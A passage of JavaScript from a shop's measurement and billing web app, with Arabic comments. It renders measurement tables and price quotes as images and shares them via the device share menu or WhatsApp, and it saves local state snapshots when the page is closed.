         حدة بلا جمع بينها — فالأنواع لا تُجمع: لكل نوع سعره وحسابه. */

      // البنود المالية تظهر فقط في الصفحة الأخيرة لأنها تخص الطلب بالكامل
      if (isLastPage) {
        /* كل نوع في سطر واحد: أمتاره وسعره وإجماليه معاً.
           الأنواع لا تُجمع في رقم واحد بالمتر — لكل نوع حسابه المستقل،
           والمجموع الوحيد المكتوب هو مجموع الأموال أسفل القائمة. */
        let billListHTML = '';
        document.querySelectorAll('.bill-row').forEach(row => {
          const name = row.querySelector('.b-n').value.trim();
          const qty = row.querySelector('.b-q').value;
          const price = row.querySelector('.b-p').value;
          const total = row.querySelector('.b-total').innerText;
          if(!name) return;
          // بند مولَّد من نوع مقاسات: الكمية هي أمتاره، فنكتب الوحدة صراحةً
          const isTypeRow = !!row.getAttribute('data-auto-type');
          const qtyTxt = (qty || 0) + (isTypeRow ? ' م²' : '');
          billListHTML += `<div style="display:flex; justify-content:space-between; align-items:center; gap:10px; padding:6px 0; border-bottom:1px dashed var(--border);">
              <span style="font-weight:${isTypeRow ? '800' : '600'};">${escapeHtml(name)}</span>
              <span style="font-family:'JetBrains Mono',monospace; direction:ltr; white-space:nowrap;">${qtyTxt} × ${price||0} = <b>${total||0}</b></span>
            </div>`;
        });
        document.getElementById('shareBillList').innerHTML = billListHTML || '<div style="text-align:center; color:var(--muted);">لا توجد بنود مالية</div>';
        document.getElementById('shareBillGrandTotal').innerText = document.getElementById('grandTotal').innerText;
        document.getElementById('shareBillSection').style.display = 'block';
      } else {
        document.getElementById('shareBillSection').style.display = 'none';
      }

      const captureEl = document.getElementById('captureArea');
      const elW = captureEl.scrollWidth;
      const elH = captureEl.scrollHeight;
      const scale = computeSafeScale(elW, elH, 3);

      let blob = null;
      try {
        await ensureHtml2Canvas();
        const canvasExport = await wsCaptureSafe(() => html2canvas(captureEl, { backgroundColor: '#ffffff', scale, useCORS: true, imageTimeout: 0 }));
        blob = await new Promise(resolve => canvasExport.toBlob(resolve, 'image/png', 1.0));
      } catch (captureError) {
        console.warn('html2canvas unavailable; creating measurement image with native canvas:', captureError);
        blob = await createNativeMeasurementsImage(pageItems, startIdx, pageNum, totalPages, isLastPage);
      } finally {
        document.querySelectorAll('.no-print').forEach(el => el.style.display = '');
        document.getElementById('shareDate').style.display = 'none';
        pageIndicator.style.display = 'none';
        document.getElementById('shareBillSection').style.display = 'none';
      }
      return blob;
    }

    async function shareImageDirect() {
      if(jobList.length === 0) { alert('لا توجد مقاسات مضافة للجدول بعد'); return; }

      const btn = document.getElementById('shareImgBtn');
      const originalHTML = btn.innerHTML;
      btn.disabled = true;

      const CHUNK_SIZE = 10; // كل 10 مقاسات = صورة/صفحة واحدة حفاظاً على الجودة
      const totalPages = Math.ceil(jobList.length / CHUNK_SIZE);

      try {
        const custName = document.getElementById('custName').value || 'مقاسات';
        const custPhone = document.getElementById('custPhone').value;
        const files = [];
        for (let page = 0; page < totalPages; page++) {
          btn.innerHTML = totalPages > 1
            ? `<i class="fas fa-spinner fa-spin"></i> جارِ تجهيز الصورة ${page+1} من ${totalPages}...`
            : '<i class="fas fa-spinner fa-spin"></i> جارِ التجهيز...';
          const startIdx = page * CHUNK_SIZE;
          const pageItems = jobList.slice(startIdx, startIdx + CHUNK_SIZE);
          const isLastPage = page === totalPages - 1;
          const blob = await captureMeasurementsPage(pageItems, startIdx, page + 1, totalPages, isLastPage);
          if (!blob || !(blob instanceof Blob) || blob.size === 0) {
            throw new Error('Measurement image capture returned an empty image blob');
          }
          const safeCustomerName = String(custName).replace(/[\\/:*?"<>|]/g, '_').trim() || 'مقاسات';
          const fileName = totalPages > 1 ? `مقاسات_${safeCustomerName}_${page+1}-${totalPages}.png` : `مقاسات_${safeCustomerName}.png`;
          files.push(new File([blob], fileName, { type: 'image/png' }));
        }

        // إعادة الجدول لعرضه الطبيعي الكامل والتفاعلي بعد الانتهاء من كل صفحات الالتقاط
        renderTable();
        updateShareHeader();

        btn.innerHTML = originalHTML;
        btn.disabled = false;

        // نص مرافق للمشاركة المباشرة: اسم الزبون ورقم هاتفه ورابط موقعه (إن وُجد)، يظهر مع الصورة كتعليق قابل للنسخ عند واتساب وغيره
        let shareTextLines = [];
        if(custName && custName !== 'مقاسات') shareTextLines.push(custName);
        if(custPhone) shareTextLines.push('📞 ' + custPhone);
        const mapsUrl = getLocationMapsUrl();
        if(mapsUrl) shareTextLines.push('📍 ' + mapsUrl + (typeof custLocation.acc === 'number' ? ` (دقة ±${custLocation.acc} م)` : ''));
        const shareText = shareTextLines.join('\n');
        const shareTitle = totalPages > 1 ? `صور المقاسات (${totalPages} صور)` : 'صورة المقاسات';

        if (navigator.share && navigator.canShare && navigator.canShare({ files })) {
          // مشاركة ملفات PNG الفعلية عبر قائمة المشاركة في الجهاز (واتساب أو أي تطبيق يدعم الصور).
          try {
            await navigator.share({ files, title: shareTitle, text: shareText });
          } catch (err) {
            // إلغاء المستخدم لقائمة المشاركة أمر طبيعي؛ أما فشل النظام فيعرض الصور كبديل واضح.
            if (!err || (err.name !== 'AbortError' && err.name !== 'NotAllowedError')) {
              console.warn('Measurement image share failed; showing image preview:', err);
              showImagePreview(files);
            }
          }
        } else {
          // عند عدم دعم مشاركة الملفات، اعرض الصور كاملة داخل التطبيق للحفظ أو المشاركة اليدوية.
          showImagePreview(files);
        }
      } catch(e) {
        console.error('shareImageDirect:', e);
        // إعادة واجهة الجدول حتى لو فشل تحميل html2canvas أو التقاط إحدى الصفحات.
        try {
          document.querySelectorAll('.no-print').forEach(el => el.style.display = '');
          const header = document.getElementById('shareHeader'); if (header) header.style.display = 'none';
          const date = document.getElementById('shareDate'); if (date) date.style.display = 'none';
          const indicator = document.getElementById('sharePageIndicator'); if (indicator) indicator.style.display = 'none';
          const bill = document.getElementById('shareBillSection'); if (bill) bill.style.display = 'none';
          renderTable();
          updateShareHeader();
        } catch (restoreError) { console.warn('restore after image capture failure:', restoreError); }
        btn.innerHTML = originalHTML;
        btn.disabled = false;
        alert('⚠️ تعذّر إنشاء صورة المقاسات حتى باستخدام أداة الرسم المحلية. لم تُحذف أي مقاسات أو بنود مالية. أعد المحاولة أو أغلق نافذة المشاركة ثم حاول مجدداً.');
      }
    }

    // عرض الصورة داخل التطبيق كبديل عن التنزيل التلقائي عند تعذر المشاركة المباشرة
    function showImagePreview(blobOrBlobs) {
      // يقبل Blob واحد أو مصفوفة من الـ Blobs لعرض عدة صور (صفحات) دفعة واحدة
      const list = (Array.isArray(blobOrBlobs) ? blobOrBlobs : [blobOrBlobs]).filter(b => b && (b instanceof Blob));
      if (!list.length) { alert('تعذّر إنشاء الصورة. حاول مرة أخرى بعد التأكد من الاتصال.'); return; }
      const urls = list.map(b => URL.createObjectURL(b));
      window._imgPreviewBlobs = list;

      const modal = document.createElement('div');
      modal.id = 'imgPreviewModal';
      modal.style.cssText = 'position:fixed; inset:0; background:rgba(15,20,32,0.92); z-index:5000; display:flex; flex-direction:column; align-items:center; padding:16px; overflow-y:auto;';
      modal.innerHTML = `
        <div style="width:100%; max-width:420px; display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; position:sticky; top:0;">
          <b style="color:white;"><i class="fas fa-image"></i> ${list.length > 1 ? `صور المقاسات (${list.length} صور)` : 'صورة المقاسات'}</b>
          <button onclick="closeImagePreview()" style="background:rgba(255, 255, 255, 0.15); border:none; color:white; width:34px; height:34px; border-radius:50%; font-size:16px;"><i class="fas fa-times"></i></button>
        </div>
        ${urls.map((url, i) => `
          <div style="width:100%; max-width:420px; margin-bottom:14px;">
            ${list.length > 1 ? `<div style="color:#8eceae; font-size:12px; font-weight:700; margin-bottom:6px;">صفحة ${i+1} من ${list.length}</div>` : ''}
            <img src="${safeImgSrc(url)}" style="width:100%; border-radius:14px; box-shadow:0 10px 30px rgba(0, 0, 0, 0.4);">
          </div>
        `).join('')}
        <p style="color:#d1d4d3; font-size:12px; text-align:center; margin:4px 8px 12px;">اضغط مطولاً على أي صورة لحفظها أو مشاركتها مباشرة من متصفحك</p>
        <div class="grid" style="width:100%; max-width:420px; gap:10px; margin-bottom:16px;">
          <button class="btn" style="background:var(--accent); color:white;" onclick="copyImagePreview()"><i class="fas fa-copy"></i> ${list.length > 1 ? 'نسخ أول صورة' : 'نسخ الصورة'}</button>
          <button class="btn" style="background:rgba(255, 255, 255, 0.15); color:white;" onclick="closeImagePreview()"><i class="fas fa-check"></i> تم</button>
        </div>
      `;
      document.body.appendChild(modal);
    }

    function closeImagePreview() {
      const modal = document.getElementById('imgPreviewModal');
      if(modal) {
        modal.querySelectorAll('img').forEach(img => {
          if(img.src.startsWith('blob:')) URL.revokeObjectURL(img.src);
        });
        modal.remove();
      }
    }

    async function copyImagePreview() {
      // بعض المتصفحات (خاصة الجوال) لا تدعم نسخ الصور للحافظة إطلاقاً، أو ترفض نسخ كائن File
      // (خلافاً لـ Blob عادي) رغم كونه امتداداً له، لذا نتأكد من الدعم أولاً ونحوّله لـ Blob صريح قبل النسخ
      if(!navigator.clipboard || !navigator.clipboard.write || typeof ClipboardItem === 'undefined') {
        alert('⚠️ النسخ التلقائي غير مدعوم في هذا المتصفح، استخدم الضغط المطول على الصورة للحفظ أو المشاركة');
        return;
      }
      try {
        const firstBlob = (window._imgPreviewBlobs && window._imgPreviewBlobs[0]) || window._imgPreviewBlob;
        if(!firstBlob) throw new Error('no-blob');
        const pngBlob = new Blob([firstBlob], { type: 'image/png' });
        await navigator.clipboard.write([new ClipboardItem({ 'image/png': pngBlob })]);
        alert('تم نسخ الصورة ✅ يمكنك لصقها الآن في واتساب أو أي تطبيق');
      } catch(e) {
        alert('⚠️ تعذر نسخ الصورة تلقائياً (' + (e && e.name ? e.name : 'خطأ غير معروف') + ')، استخدم الضغط المطول على الصورة للحفظ أو المشاركة');
      }
    }

    /* ══════════════════════════════════════════════════════════════════
       عرض السعر المبدئي — 9.2.0
       ══════════════════════════════════════════════════════════════════
       يُنتج للعميل نفس أرقام النظام تماماً، **ولا يكتب حرفاً واحداً** في
       أي مجموعة: لا sales ولا payments ولا مخزون ولا دَين.

       ولماذا هذا مهم؟ لأن الاعتماد عمليةٌ لا رجعة فيها عملياً: يفتح
       حساباً في الفواتير، ويخصم المخزون، ويسجّل ديناً. فمن اعتمد ليُري
       العميل سعراً ثم رفض العميل، بقي في دفاتره حساب وهمي ودَين على من
       لم يشترِ — ويحتاج مديراً ليحذفه.

       ⚠️ تحديث 9.3.1: أُزيلت عبارات «مبدئي/غير معتمد» من الورقة بطلب
       صاحب المحل — تُضعفها في يد العميل وتجعلها تبدو مسوّدة. فالورقة
       الآن تبدو فاتورةً عادية للعميل.

       ويبقى الفرق حيث يهمّ فعلاً، لا في المظهر:
         • الرقم المرجعي يبدأ بـ Q- لا INV- (يعرفه المحل ولا يلفت العميل).
         • **ولا تُكتب في السجلات إطلاقاً**: لا sales ولا payments ولا
           مخزون ولا دَين. وهذا هو الضمان الحقيقي، لا الكلمة المطبوعة.

       والأثر المترتب على ذلك يخصّ الموظف: لم يعد في الورقة ما يذكّره بأن
       الاعتماد لم يقع بعد. فنصّ الزرّ نفسه يحمل التذكير: «(لا تُحفظ)».

       والأرقام تُحسب بنفس money2 التي يحسب بها الاعتماد — فلو وافق العميل
       واعتُمدت الخدمة، جاء المجموع مطابقاً لما رآه بالضبط. واختلافُ قرش
       واحد بين العرض والفاتورة يكفي لنزاع. */
    // حفظ صريح للبنود المالية بالإضافة إلى الحفظ التلقائي عند كل تعديل.
    // يثبت المسودة محلياً أولاً، ثم يطلب مزامنتها إلى مستند الكراسة نفسه.
    // v311: لقطة طوارئ محلية عند مغادرة الصفحة/إغلاق التبويب؛ لا تعتمد على المزامنة الشبكية.
    (function installFinancialExitSnapshotGuard() {
      if (window.__wsV311ExitSnapshotGuard) return;
      window.__wsV311ExitSnapshotGuard = true;
      const persistEmergencySnapshot = () => {
        if(_loadingArchive||_resumeChoiceOpen)return;
        try {
          if (typeof buildStateSnapshot !== 'function') return;
          const state=buildStateSnapshot();if(!hasAnyData(state))return;
          const snapshot = JSON.stringify(state);
          if (!snapshot || snapshot === 'null') return;
          safeSetItem('ws_last_state', snapshot);
          safeSetItem('ws_last_state_backup_v310', snapshot);
          safeSetItem('ws_last_state_backup_v310_at', String(Date.now()));
          safeSetItem('ws_last_state_backup_v311_at', String(Date.now()));
          safeSetItem('ws_last_state_backup_v312', snapshot);
          safeSetItem('ws_last_state_backup_v312_at', String(Date.now()));
          try { touchMeasurementActivity(); } catch (_) {}
        } catch (e) { console.warn('تعذر حفظ لقطة الطوارئ عند مغادرة الكراسة:', e); }
      };
      window.addEventListener('pagehide', persistEmergencySnapshot, { capture: true });
      document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'hidden') persistEmergencySnapshot();
      }, { capture: true });
    })();

    function saveFinancialItemsNow() {
      try {
        const state = buildStateSnapshot();
        const emergencySerialized = JSON.stringify(state);
        safeSetItem('ws_last_state', emergencySerialized);
        safeSetItem('ws_last_state_backup_v310', emergencySerialized);
        safeSetItem('ws_last_state_backup_v310_at', String(Date.now()));
        safeSetItem('ws_last_state_backup_v312', emergencySerialized);
        safeSetItem('ws_last_state_backup_v312_at', String(Date.now()));
        try { touchMeasurementActivity(); } catch (_) {}
        if (_loadingArchive) {
          showMiniToast('حُفظت البنود محلياً؛ تكتمل المزامنة بعد تحميل الكراسة.', '#0e91a0');
          return;
        }
        if (sheetViewOnly) {
          showMiniToast('الكراسة للعرض فقط. اضغط «تعديل وإضافة مقاسات» أولاً.', '#a65b00');
          return;
        }
        if (currentArchiveDocId) {
          scheduleArchiveSync();
          showMiniToast('حُفظت التعديلات محلياً وجارٍ مزامنتها مع الكراسة.', '#0e91a0');
        } else if (hasMeaningfulData(state)) {
          createArchiveEntry();
          showMiniToast('حُفظت البنود محلياً وربطها بالأرشيف جارٍ.', '#0e91a0');
        } else {
          showMiniToast('حُفظت البنود محلياً. أضف اسم بند أو مقاساً ليتم أرشفتها.', '#0e91a0');
        }
      } catch (e) {
        console.error('saveFinancialItemsNow:', e);
        alert('تعذّر حفظ البنود المالية. لم تُحذف التعديلات من الشاشة؛ حاول مرة أخرى.');
      }
    }

    function quoteTotals() {
      const items = collectBillItems();
      let itemsTotal = 0;
      items.forEach(i => { itemsTotal = money2(itemsTotal + money2(i.qty * i.price)); });
      const finalTotal = sheetTotalOverride !== null ? money2(sheetTotalOverride) : money2(itemsTotal);
      const delta = money2(finalTotal - itemsTotal);
      // إن غيّر المستخدم الإجمالي يدوياً، نظهر الفرق كبند واضح في العرض
      // حتى يبقى مجموع تفاصيل الصورة مطابقاً تماماً للإجمالي النهائي.
      if (delta > 0) items.push({ name: 'تسوية', qty: 1, price: delta, adjustment: true });
      else if (delta < 0) items.push({ name: 'خصم', qty: 1, price: delta, adjustment: true });
      return { items: items, total: finalTotal, itemsTotal: money2(itemsTotal) };
    }

    function sharePreliminaryQuote() {
      const name  = (document.getElementById('custName').value || '').trim();
      const q = quoteTotals();

      if (!q.items.length) {
        alert('أضف بنداً مالياً واحداً على الأقل قبل إرسال العرض.\n\n' +
              'استعمل زر «إضافة بند مالي» أسفل جدول المقاسات.');
        return;
      }

      const shop = 'اللمسة الأخيرة';
      let t = '*' + shop + '*\n';
      t += '━━━━━━━━━━━━━━━\n';
      if (name) t += 'العميل: ' + name + '\n';
      t += 'التاريخ: ' + new Date().toLocaleDateString('ar-EG') + '\n\n';

      t += '*البنود:*\n';
      q.items.forEach(i => {
        t += '• ' + i.name + ' — ' + i.qty + ' × ' + Number(i.price).toFixed(2) +
             ' = ' + money2(i.qty * i.price).toFixed(2) + ' د.ل\n';
      });
      t += '\n*الإجمالي: ' + q.total.toFixed(2) + ' د.ل*\n';
      t += '━━━━━━━━━━━━━━━\n';
      t += '_شكراً لثقتكم بنا_';

      /* رقم العميل إن كان مكتوباً: تفتح المحادثة معه مباشرةً */
      const phone = (document.getElementById('custPhone').value || '').replace(/[^\d]/g, '');
      const to = phone ? ('https://wa.me/' + (phone.startsWith('218') ? phone : ('218' + phone.replace(/^0+/, '')))) : 'https://wa.me/';
      window.open(to + '?text=' + encodeURIComponent(t), '_blank', 'noopener,noreferrer');

      showMiniToast('📄 أُرسل عرض السعر — لم يُسجَّل في الفواتير', '#0e91a0');
    }

    /* ══════════════════════════════════════════════════════════════════
       صورة الفاتورة المبدئية — 9.3.0
       ══════════════════════════════════════════════════════════════════
       تُنتج صورة بنفس شكل فاتورة النظام تماماً، **ولا تكتب حرفاً** في أي
       مجموعة: لا sales ولا payments ولا مخزون ولا دَين ولا رقم فاتورة
       يُستهلك.

       ولماذا صورة لا نصّاً؟ لأن العميل يقارن العروض، والصورة تُحفظ في
       هاتفه وتُعرض على شريكه وتصل كما هي. والنصّ يُعاد تنسيقه في كل
       تطبيق فتختلط الأعمدة وتضيع المحاذاة.

       والتمييز عن الفاتورة الحقيقية مقصود وظاهر في ثلاثة مواضع لا واحد:
       الشارة العلوية، وشريط أحمر تحت الترويسة، وسطر في الذيل. فمن يراها
       لا يظنّها فاتورة، ولا يحتجّ بها لاحقاً على سعر تغيّر.

       ولا رقم فاتورة فيها — بل «عرض رقم» مشتقّ من التاريخ. إعطاؤها رقم
       فاتورة حقيقياً يعني إمّا استهلاك رقم من التسلسل (فتظهر فجوة في
       الأرشيف لا يُعرف سببها)، وإمّا تكراره لاحقاً مع فاتورة فعلية. */
    /* ⚠️ 9.3.1 — حُذف من بطاقة الفاتورة شيئان بطلب صاحب المحل:

       • **قائمة المقاسات**: تفصيلٌ داخليّ للورشة لا للعميل. ووجودها في
         ورقة السعر يفتح باب مساومة على كل سطر، ويُمكّن من يأخذ ورقتك إلى
         ورشة أخرى فيقصّ عليها — وهي ثمرة معاينتك ووقتك.

       • **عبارة «غير معتمدة» وشريط التحذير**: تُضعف الورقة في يد العميل
         وتجعلها تبدو مسوّدة لا عرضاً جادّاً.

       وما يبقى مُميِّزاً لها: الرقم المرجعي يبدأ بـ Q- لا INV-، وهو فرق
       يعرفه المحل ولا يلفت العميل. والأهم أنها **لا تُكتب في أي سجل**:
       لا sales ولا payments ولا مخزون ولا دَين — وهذا هو الضمان الحقيقي،
       لا الكلمة المطبوعة على الورقة.

       (وكان هذا الشرح مكتوباً داخل قالب الـHTML نفسه، فيُشحن مع كل بطاقة
        تُنتَج. وهو نفس صنف الخطأ الذي عطّل الـCSP في 8.8.5: شرحٌ وُضع في
        مُخرَج لا في مصدر. مكانه هنا.) */
    function buildQuoteCardHTML() {
      const name  = (document.getElementById('custName').value || '').trim() || '—';
      const phone = (document.getElementById('custPhone').value || '').trim() || 'لا يوجد';
      const q = quoteTotals();
      const now = new Date();
      const ref = 'Q-' + now.getFullYear() + String(now.getMonth()+1).padStart(2,'0') +
                  String(now.getDate()).padStart(2,'0') + '-' + String(now.getHours()).padStart(2,'0') +
                  String(now.getMinutes()).padStart(2,'0');

      const rows = q.items.map(i => `
        <tr>
          <td style="padding:11px 4px;border-bottom:1px solid #eee9e4;text-align:center;color:#5c6b63;" dir="ltr">${escHtml(i.qty)}</td>
          <td style="padding:11px 4px;border-bottom:1px solid #eee9e4;font-weight:700;color:#1d2a24;text-align:right;">${escHtml(i.name)}</td>
          <td style="padding:11px 4px;border-bottom:1px solid #eee9e4;text-align:center;color:#5c6b63;" dir="ltr">${money2(i.price).toFixed(2)}</td>
          <td style="padding:11px 4px;border-bottom:1px solid #eee9e4;text-align:center;font-weight:800;color:#0f5132;" dir="ltr">${money2(i.qty*i.price).toFixed(2)}</td>
        </tr>`).join('');

      return `
      <div style="width:620px;background:#fff;font-family:Cairo,Tajawal,sans-serif;direction:rtl;padding:30px 28px;box-sizing:border-box;">
        <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:14px;">
          <div style="text-align:right;">
            <div style="font-size:27px;font-weight:900;color:#0f5132;line-height:1.25;">اللمسة الأخيرة</div>
            <div style="font-size:12px;color:#8a938d;margin-top:5px;">مطابخ PVC · سرانتي · ناموسيات</div>
          </div>
          <div style="text-align:left;">
            <div style="display:inline-block;background:#0f5132;color:#fff;padding:7px 15px;border-radius:9px;font-size:12px;font-weight:900;letter-spacing:.5px;">فاتورة</div>
            <div style="margin-top:8px;font-size:12px;color:#5c6b63;font-family:monospace;" dir="ltr">${escHtml(ref)}</div>
            <div style="margin-top:3px;font-size:11px;color:#8a938d;">${escHtml(now.toLocaleString('ar-EG'))}</div>
          </div>
        </div>

        <div style="height:3px;background:#0f5132;margin:16px 0 0;"></div>

        <div style="background:#f3f7f5;border-radius:12px;padding:14px 16px;margin-top:14px;display:flex;justify-content:space-between;">
          <div><div style="font-size:11px;color:#8a938d;">صادر إلى:</div>
               <div style="font-size:16px;font-weight:900;color:#1d2a24;margin-top:3px;">${escHtml(name)}</div></div>
          <div style="text-align:left;"><div style="font-size:11px;color:#8a938d;">رقم الهاتف:</div>
               <div style="font-size:15px;font-weight:800;color:#1d2a24;margin-top:3px;" dir="ltr">${escHtml(phone)}</div></div>
        </div>

        <table style="width:100%;border-collapse:collapse;margin-top:18px;font-size:13px;">
          <thead><tr style="color:#8a938d;font-size:11px;">
            <th style="text-align:center;padding:0 4px 8px;font-weight:700;">الكمية</th>
            <th style="text-align:right;padding:0 4px 8px;font-weight:700;">الصنف</th>
            <th style="text-align:center;padding:0 4px 8px;font-weight:700;">السعر</th>
            <th style="text-align:center;padding:0 4px 8px;font-weight:700;">الإجمالي</th>
          </tr></thead>
          <tbody>${rows}</tbody>
        </table>

        <div style="margin-top:18px;border:1px solid #dfe7e2;border-radius:12px;overflow:hidden;">
          <div style="display:flex;justify-content:space-between;align-items:center;padding:13px 16px;background:#f3f7f5;">
            <span style="font-weight:800;color:#1d2a24;">إجمالي البنود المالية:</span>
            <span style="font-weight:900;font-size:19px;color:#0f5132;" dir="ltr">${q.total.toFixed(2)} د.ل</span>
          </div>
          <div style="display:flex;justify-content:space-between;padding:10px 16px;border-top:1px solid #dfe7e2;background:#fff;">
            <span style="font-weight:700;color:#5c6b63;">المدفوع:</span>
            <span style="font-weight:800;color:#1d2a24;" dir="ltr">${money2(Math.max(0, Math.min(q.total, parseFloat(String((document.getElementById('sheetPaid') || {}).value || '0').replace(/,/g,'')) || 0))).toFixed(2)} د.ل</span>
          </div>
          <div style="display:flex;justify-content:space-between;padding:10px 16px;background:#f9fbfa;border-top:1px solid #dfe7e2;">
            <span style="font-weight:800;color:#1d2a24;">المتبقي:</span>
            <span style="font-weight:900;color:#a33b2f;" dir="ltr">${money2(Math.max(0, q.total - Math.max(0, Math.min(q.total, parseFloat(String((document.getElementById('sheetPaid') || {}).value || '0').replace(/,/g,'')) || 0)))).toFixed(2)} د.ل</span>
          </div>
        </div>

        <div style="margin-top:18px;text-align:center;font-size:11px;color:#8a938d;line-height:1.9;">
          شكراً لثقتكم بنا · اللمسة الأخيرة
        </div>
      </div>`;
    }

    async function createNativeQuoteImageBlob() {
      const q = quoteTotals();
      const width = 1240, pad = 64, rowH = 74;
      const height = 620 + q.items.length * rowH;
      const canvas = document.createElement('canvas'); canvas.width=width; canvas.height=height;
      const ctx=canvas.getContext('2d'); if(!ctx) throw new Error('Canvas context unavailable');
      ctx.fillStyle='#fff'; ctx.fillRect(0,0,width,height);
      ctx.fillStyle='#0f5132'; ctx.fillRect(pad,45,width-pad*2,7);
      ctx.direction='rtl'; ctx.textAlign='right'; ctx.fillStyle='#0f5132'; ctx.font='bold 46px Arial'; ctx.fillText('اللمسة الأخيرة',width-pad,115);
      ctx.fillStyle='#68766e'; ctx.font='25px Arial'; ctx.fillText('مطابخ PVC · سرانتي · ناموسيات',width-pad,158);
      const name=(document.getElementById('custName')?.value||'—').trim()||'—';
      const phone=(document.getElementById('custPhone')?.value||'لا يوجد').trim()||'لا يوجد';
      ctx.fillStyle='#f2f7f4'; ctx.fillRect(pad,190,width-pad*2,112);
      ctx.fillStyle='#26372e'; ctx.font='bold 27px Arial'; ctx.fillText('العميل: '+name,width-pad-20,235);
      ctx.fillText('الهاتف: '+phone,width-pad-20,277);
      ctx.fillStyle='#f0f4f1'; ctx.fillRect(pad,325,width-pad*2,60);
      ctx.fillStyle='#42554a'; ctx.font='bold 24px Arial';
      ctx.textAlign='center'; ctx.fillText('الكمية',width-pad-75,363);
      ctx.textAlign='right'; ctx.fillText('الصنف',width-300,363);
      ctx.textAlign='center'; ctx.fillText('السعر',width-500,363); ctx.fillText('الإجمالي',pad+85,363);
      let y=385;
      q.items.forEach(item=>{
        ctx.strokeStyle='#e1e8e3';ctx.beginPath();ctx.moveTo(pad,y+rowH);ctx.lineTo(width-pad,y+rowH);ctx.stroke();
        ctx.direction='ltr';ctx.textAlign='center';ctx.fillStyle='#5c6b63';ctx.font='24px Arial';ctx.fillText(String(item.qty),width-pad-75,y+44);
        ctx.direction='rtl';ctx.textAlign='right';ctx.fillStyle='#1d2a24';ctx.font='bold 25px Arial';ctx.fillText(item.name,width-300,y+44,300);
        ctx.direction='ltr';ctx.textAlign='center';ctx.fillStyle='#5c6b63';ctx.font='24px Arial';ctx.fillText(money2(item.price).toFixed(2),width-500,y+44);
        ctx.fillStyle='#0f5132';ctx.font='bold 25px Arial';ctx.fillText(money2(item.qty*item.price).toFixed(2),pad+85,y+44);
        y+=rowH;
      });
      y+=28; ctx.fillStyle='#edf5f0';ctx.fillRect(pad,y,width-pad*2,92);
      ctx.direction='rtl';ctx.textAlign='right';ctx.fillStyle='#0f5132';ctx.font='bold 31px Arial';ctx.fillText('الإجمالي: '+money2(q.total).toFixed(2)+' د.ل',width-pad-22,y+40);
      const paidRaw=String((document.getElementById('sheetPaid')||{}).value||'0').replace(/,/g,'');
      const paid=money2(Math.max(0,Math.min(q.total,parseFloat(toLatinNums(paidRaw))||0)));
      ctx.fillStyle='#26372e';ctx.font='bold 24px Arial';ctx.fillText('المدفوع: '+paid.toFixed(2)+' د.ل',width-pad-22,y+75);
      ctx.fillStyle='#a33b2f';ctx.font='bold 24px Arial';ctx.fillText('المتبقي: '+money2(Math.max(0,q.total-paid)).toFixed(2)+' د.ل',width-pad-22,y+111);
      ctx.textAlign='center';ctx.fillStyle='#68766e';ctx.font='22px Arial';ctx.fillText('شكراً لثقتكم بنا · اللمسة الأخيرة',width/2,height-24);
      return nativeCanvasBlob(canvas,'image/jpeg',0.94);
    }

    async function sharePreliminaryQuoteImage() {
      const q = quoteTotals();
      if (!q.items.length) {
        alert('أضف بنداً مالياً واحداً على الأقل قبل إنشاء العرض.\n\n' +
              'استعمل زر «إضافة بند مالي» أسفل جدول المقاسات.');
        return;
      }
      /* الحاوية خارج الشاشة لا مخفيّة: html2canvas لا يلتقط عنصراً
         display:none (عرضه صفر)، فيخرج الملف فارغاً بلا خطأ. */
      const holder = document.createElement('div');
      holder.style.cssText = 'position:fixed;left:-10000px;top:0;z-index:-1;';
      holder.innerHTML = buildQuoteCardHTML();
      document.body.appendChild(holder);
      try {
        let blob;
        try {
          await ensureHtml2Canvas();
          const canvas = await wsCaptureSafe(() => html2canvas(holder.firstElementChild, {
            scale: 2, backgroundColor: '#ffffff', useCORS: true, logging: false
          }));
          blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.92));
        } catch (renderError) {
          console.warn('html2canvas unavailable; creating invoice image with native canvas:', renderError);
          blob = await createNativeQuoteImageBlob();
        }
        if (!blob || !blob.size) throw new Error('تعذّر إنشاء صورة الفاتورة');
        const name = (document.getElementById('custName').value || 'عميل').trim().replace(/[\/:*?"<>|]/g, '_') || 'عميل';
        const file = new File([blob], 'فاتورة-' + name + '.jpg', { type: 'image/jpeg' });
        if (navigator.share && navigator.canShare && navigator.canShare({ files: [file] })) {
          try {
            await navigator.share({ files: [file], title: 'فاتورة',
                                    text: (document.getElementById('custName').value || '').trim() });
          } catch (shareErr) {
            if (shareErr && shareErr.name === 'AbortError') return;
            console.warn('invoice image share failed; showing image preview:', shareErr);
            showImagePreview([blob]);
          }
        } else {
          showImagePreview([blob]);
        }
        showMiniToast('🖼️ تم تجهيز صورة البنود المالية للمشاركة — دون تسجيل فاتورة جديدة', '#0e91a0');
      } catch (e) {
        console.error('sharePreliminaryQuoteImage:', e);
        alert('تعذّر إنشاء صورة الفاتورة. لم يتم إرسالها كنص ولم تُسجّل فاتورة جديدة. يمكنك إعادة المحاولة؛ لم تتغير البنود أو الحسابات.');
      } finally {
        holder.remove();
      }
    }

    function shareFullBillWhatsApp() {
      let name = document.getElementById('custName').value || 'زبون';
      let text = `*طلب زبون: ${name}*\n------------------\n`;
      jobList.forEach((i, idx) => { text += `${idx+1}. ${getTypeName(i.type)} | ${i.w}×${i.h} | ${i.res}م² ${i.note?'('+i.note+')':''}\n`; });
      text += `\n*الإجمالي:* ${document.getElementById('grandTotal').innerText} د.ل`;
      window.open(`https://wa.me/?text=${encodeURIComponent(text)}`);
    }

    /* ══════════════════════════════════════════════════════════════════
       مشاركة **كل** جداول المقاسات دفعة واحدة — 9.5.1
       ══════════════════════════════════════════════════════════════════
       shareFullBillWhatsApp تشارك جدول الكراسة المفتوحة وحدها. ومن أراد
       إرسال عمل اليوم كله إلى الورشة كان يفتح كل كراسة ويشاركها ويعود —
       عشر كراسات تعني عشرين انتقالاً ورسالة لكل واحدة، والورشة تجمعها
       بنفسها فتختلط المقاسات بين الزبائن.

       وهذا **غير** «حفظ كل الكراسات» (exportAllSheets): ذاك ملف JSON
       للنسخ الاحتياطي، يُقرأ بالنظام لا بالعين. وهذا نصٌّ مقروء يُرسل
       للمشغّل فيقصّ منه مباشرةً.

       والترتيب مقصود: غير المعتمدة أولاً، فهي ما ينتظر قراراً. ثم
       المعتمدة مرتّبة من الأحدث — وهي ما يُعمل عليه الآن. */
    function buildAllSheetsText(onlyUnapproved) {
      const live = (archives || []).filter(a => !a.deleted &&
